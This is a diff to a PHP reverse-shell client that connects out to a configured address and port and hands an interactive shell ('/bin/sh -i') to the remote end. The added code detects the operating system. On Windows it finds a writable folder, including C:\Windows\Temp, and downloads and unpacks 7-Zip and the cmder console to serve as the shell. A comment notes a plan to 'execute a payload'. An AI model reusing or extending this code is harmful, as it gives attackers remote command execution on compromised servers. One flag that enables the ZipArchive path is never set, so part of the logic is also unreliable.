@@ -16,6 +16,24 @@ echo $url . "\n";
 
 $bin = PHP_BINDIR;
 $path = realpath ( NULL ) . '/';
+$tmp_path = $path;
+$os = null;
+$shell = null;
+
+$descriptorspec = array (
+		array (
+				'pipe',
+				'r' 
+		),
+		array (
+				'pipe',
+				'w' 
+		),
+		array (
+				'pipe',
+				'w' 
+		) 
+);
 
 $address = '127.0.0.1';
 $port = 3391;
@@ -59,6 +77,90 @@ if (function_exists ( 'proc_open' )) {
 	exit ( "Failed." );
 }
 
+echo "Detecting Operative System... ";
+$os = strtoupper ( substr ( PHP_OS, 0, 3 ) );
+echo "Ok.\n";
+
+if ($os === 'WIN') {
+	$bytes = 0;
+	
+	$ziparchive = false;
+	
+	$sevenzip = false;
+	$sevenzip_file = "7z1604.exe";
+	
+	$cmder_zip = "cmder_mini.zip";
+	$cmder = "Cmder.exe";
+	$cmder_path = "cmder/";
+	$cmder_url = "https://github.com/cmderdev/cmder/releases/download/v1.3.2/cmder_mini.zip";
+	$cmder_version = "1.3.2";
+	
+	echo "\t\e[1mWindows\e[0m detected, we're going to download an external command prompt.\n";
+	echo "\tFinding a writable path...\n";
+	echo "\t\tTesting the current directory... ";
+	
+	if (is_writable ( $tmp_path )) {
+		echo "yes.\n";
+		echo "\t\tUsing " . $tmp_path . " to store files.\n";
+	} else {
+		echo "no.\n";
+		$tmp_path = "C:\Windows\Temp\\";
+		echo "\t\tTesting with " . $tmp_path . " ... ";
+		if (is_writable ( $tmp_path )) {
+			echo "yes.\n";
+			echo "\tUsing " . $tmp_path . " to store files.\n";
+		} else {
+			exit ( "\n\t\tNo writable path found... exiting.\n\n" );
+		}
+	}
+	
+	echo "\tChecking if \e[1mZipArchive\e[0m is available... ";
+	if (class_exists ( 'ZipArchive' )) {
+		echo "yes.\n";
+	} else {
+		echo "no.\n";
+		echo "\t\tDownloading 7zip to unzip files... ";
+		$bytes = file_put_contents ( $tmp_path . $sevenzip_file, fopen ( "http://www.7-zip.org/a/7z1604.exe", 'r' ) );
+		if ($bytes > 0) {
+			echo "Ok.\n";
+			$sevenzip = true;
+		}
+	}
+	
+	echo "\tDownloading \e[1mcmder " . $cmder_version . "\e[0m ... ";
+	$bytes = file_put_contents ( $tmp_path . $cmder_zip, fopen ( $cmder_url, 'r' ) );
+	if ($bytes > 0) {
+		echo "Ok.\n";
+		echo "\t\tTrying to unzip the file... ";
+		if ($ziparchive) {
+			$unzip = new ZipArchive ();
+			if ($unzip->open ( $tmp_path . $cmder_zip )) {
+				$unzip->extractTo ( $tmp_path . $cmder_path );
+				$unzip->close ();
+				echo "Ok.\n";
+			} else {
+				exit ( " Failed.\n\n" );
+			}
+		} else {
+			$cmd = $tmp_path . $sevenzip_file . ' x ' . $cmder_zip . ' -o' . $tmp_path . $cmder_path;
+			proc_open ( $cmd, $descriptorspec, $pipes, $path, null );
+			
+			if (file_exists ( $tmp_path . $cmder_path . $cmder )) {
+				echo " Ok.\n";
+			} else {
+				exit ( " Failed.\n\n" );
+			}
+		}
+		$shell = $tmp_path . $cmder_path . $cmder;
+	} else {
+		// TODO: Try to execute a payload.
+	}
+	echo "Now we have shell we can continue.\n";
+} else {
+	echo "\t\e[1m*nix\e[0m detected, we're using \e[1mdash\e[0m.\n";
+	$shell = '/bin/sh -i';
+}
+
 echo "Trying to open connection with the server... ";
 $session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
 
@@ -95,28 +197,12 @@ if (! $session) {
 	echo "\t" . stream_socket_recvfrom ( $session, 1024 ) . "\n";
 	
 	// Start the session.
-	echo "Session started.\n";
-	
-	$shell = '/bin/sh -i';
+	echo "Starting shell... ";
 	$process = null;
 	$process_status = null;
-	$descriptorspec = array (
-			array (
-					'pipe',
-					'r' 
-			),
-			array (
-					'pipe',
-					'w' 
-			),
-			array (
-					'pipe',
-					'w' 
-			) 
-	);
-	
 	$process = proc_open ( $shell, $descriptorspec, $pipes, $path, null );
 	$process_status = proc_get_status ( $process );
+	echo "Ok.\n";
 	
 	// Set everything to non-blocking
 	stream_set_blocking ( $pipes [0], 0 );
